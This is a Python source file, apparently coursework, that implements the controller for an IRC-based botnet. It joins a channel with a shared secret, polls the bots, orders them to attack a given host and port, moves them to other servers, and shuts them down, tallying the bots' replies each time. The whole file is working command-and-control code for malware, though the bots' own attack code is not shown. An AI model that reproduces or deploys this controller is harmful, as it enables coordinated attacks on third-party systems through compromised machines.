import socketserver
import socket
import os
import sys
import asyncio
import string
import random
import select

# Function to send bots messages
def sendPrivMSG(target,message):
    client.send(('PRIVMSG ' + target + ' :'+message +'\n').encode('utf-8'))

# Function to get the status of each bot
def do_status(client, args):
    global channel
    global id
    
    # Send each bot the command status
    sendPrivMSG(channel,'status')
    botList = []
    
    # set time out for the socket
    client.settimeout(5)
    while True:
        try:
            # receive data from bots and add each bot to the bot list
            data = client.recv(1024).decode('utf-8')
            lines = data.split('\n')
            for line in lines:
                if line:
                    if 'PRIVMSG controller' + id in line and line[:4] == ':bot':
                        botList.append(line.split(':')[2].strip())
        except socket.timeout:
            break

    # Report back the number of the found bots
    print('found '+ str(len(botList))+' bots: ', end='')
    for bot in botList:
        print(bot+', ', end='')
    print()


# Function to command bots to perform the attack
def do_attack(client, args):
    # Send the attack command to all bots
    sendPrivMSG(channel, 'attack '+args[1]+' '+args[2])
    attackList = []
    
    # Set time out for the socket
    client.settimeout(5)
    while True:
        try:
            # Get the number of successful/unsuccessful attacks and add it to the attack list
            data = client.recv(1024).decode('utf-8')
            lines = data.split('\n')
            for line in lines:
                if line:
                    if 'PRIVMSG controller' + id in line and line[:4] == ':bot':
                        attackList.append(line.split(':',2)[2].strip())
        except socket.timeout:
            break

    # Report the number of successful/unsuccessful attacks
    success = 0
    fail = 0
    for attack in attackList:
        if 'unsuccessful' in attack:
            fail += 1
        else:
            success += 1
        print(attack)
    print('Total: '+ str(success) + ' successful, '+ str(fail) +' unsuccessful')

# Function to command bots to switch host, port, and channel
def do_move(client, args):
    
    # send move command to all bots
    sendPrivMSG(channel, 'move '+args[1]+' '+args[2]+' '+args[3])
    moveList = []
    
    # set time out for the socket
    client.settimeout(5)
    while True:
        try:
            # receive the number of bots that have moved successfully and add it the move list
            data = client.recv(1024).decode('utf-8')
            lines = data.split('\n')
            for line in lines:
                if line:
                    if 'PRIVMSG controller' + id in line and line[:4] == ':bot':
                        moveList.append(line.split(':',2)[2].strip())
        except socket.timeout:
            break

    # report back the number of bots that have successfully moved
    print('Total: '+ str(len(moveList)) + ' successfully moved')

# Function to inform the bots that controller is quitting
def do_quit(client, args):
    # send the quit command
    sendPrivMSG(channel, 'quit')
    # Quit from the channel
    client.send(('QUIT\n').encode('utf-8'))
    # close the socket and exit
    client.close()
    sys.exit()

# Function to command all bots to shutdown
def do_shutdown(client, args):
    # send the command to all bots
    sendPrivMSG(channel, 'shutdown')
    shutdownList = []
    
    # set time out
    client.settimeout(5)
    while True:
        try:
            # receive the number of bots that have shutdown successfully and add it to the shutdown list
            data = client.recv(1024).decode('utf-8')
            lines = data.split('\n')
            for line in lines:
                if line:
                    if 'PRIVMSG controller' + id in line and line[:4] == ':bot':
                        shutdownList.append(line.split(':',2)[2].strip())
        except socket.timeout:
            break

    # Report back the number of successful shutdowns
    success = 0
    for shutdown in shutdownList:
        print(shutdown)
    print('Total: '+ str(len(shutdownList)) + ' disconnected')


# Structure so that the program can look into to decide which method to call based on user specified argument
interpretInput = {
    'status':do_status,
    'attack':do_attack,
    'move':do_move,
    'quit':do_quit,
    'shutdown':do_shutdown
}

secret = None
channel = None
id = ''
if __name__ == "__main__":
    # get the input from command line
    HOST = sys.argv[1]
    srcPort = int(sys.argv[2])
    channel = sys.argv[3][1:]
    secret = sys.argv[4]
    
    # create a connection to the host at the specified port
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST,srcPort))
    
    while True:
        # create a unique NICK for the controller and send it to the IRC server or try again on Nick collision
        id = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(6))
        client.send(('NICK controller'+id+'\n').encode('utf-8'))
        try:
            client.settimeout(4)
            data = client.recv(128).decode('utf-8')
            if not data == 'ERR_NICKNAMEINUSE':
                break
        except socket.timeout:
            break

    # Specify the user
    client.settimeout(None)
    client.send(('USER controller * * :controller test\n').encode('utf-8'))
    data = client.recv(1024).decode('utf-8')
    if not '001' in data:
        print('You are not welcome')
        sys.exit()

    # Join the specified channel
    client.send(('JOIN '+channel+'\n').encode('utf-8'))
    data = client.recv(1024).decode('utf-8')
    print(data)
    sendPrivMSG(channel,secret)

    # Prompt user to enter commands and interpret those commands accordingly
    while True:
        data = input("Please enter your command:")
        # Interpret user info by matching it with one of the definitions in the variable
        args = data.split()
        if not args[0] in interpretInput:
            print('No such command\n')
        else:
            interpretInput[args[0]](client,args)
                    
    # close clients socket
    client.close()
    # terminate the program
    sys.exit()




